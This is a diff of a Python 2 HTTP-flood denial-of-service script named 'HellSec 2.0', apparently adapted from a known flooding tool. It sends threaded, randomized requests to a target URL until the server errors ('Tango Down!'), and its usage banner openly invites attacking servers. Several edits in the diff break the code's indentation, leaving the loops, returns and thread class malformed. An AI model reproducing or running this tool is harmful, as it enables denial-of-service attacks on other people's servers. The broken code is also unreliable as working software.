@@ -826,7 +826,7 @@ def keyword_list():
         keyword_top.append('adele')
         keyword_top.append('HaxStroke')
         keyword_top.append('Suicide')
-        keyword_top.append('Sex')
+        keyword_top.append('Sexo')
         keyword_top.append('Robin Williams')
         keyword_top.append('World Cup')
         keyword_top.append('Ca Si Le Roi')
@@ -856,14 +856,16 @@ def keyword_list():
 	return(headers_referers)
 	
 #builds random ascii string
+
 def buildblock(size):
 	out_str = ''
-	for i in range(0, size):
+		for i in range(0, size):
 		a = random.randint(65, 160)
 		out_str += chr(a)
-	return(out_str)
+			return(out_str)
 
 def usage():
+
     print 'HellSec 2.0 - By xS1ender'
     print ''
     print 'Usage: HellSec.py (url)'
@@ -871,6 +873,7 @@ def usage():
     print 'Have fun fucking elite\'s servers'
     print 'Expect your connection to slow down; This tool is powerful'
     print "\a"
+
 print \
 """
 888    888          888 888  .d8888b.                    
@@ -883,8 +886,6 @@ print \
 888    888  "Y8888  888 888  "Y8888P"   "Y8888   "Y8888P 
                                                        
 """
-
-
 #http request
 def httpcall(url):
 	useragent_list()
@@ -905,6 +906,7 @@ def httpcall(url):
 	try:
 			urllib2.urlopen(request)
 	except urllib2.HTTPError, e:
+	
 			#print e.code
 			set_flag(1)
  			print '[+] Error 500 - Tango Down!'
@@ -919,17 +921,19 @@ def httpcall(url):
 
 	
 #http caller thread 
-class HTTPThread(threading.Thread):
-	def run(self):
-		try:
-			while flag<2:
-				code=httpcall(url)
-				if (code==500) & (safe==1):
+	class HTTPThread(threading.Thread):
+		def run(self):
+			try:
+				while flag<2:
+					code=httpcall(url)
+					if (code==500) & (safe==1):
 					set_flag(2)
-		except Exception, ex:
-			pass
+				except Exception, ex:
+					pass
+
 
 # monitors http threads and counts requests
+
 class MonitorThread(threading.Thread):
 	def run(self):
 		previous=request_counter
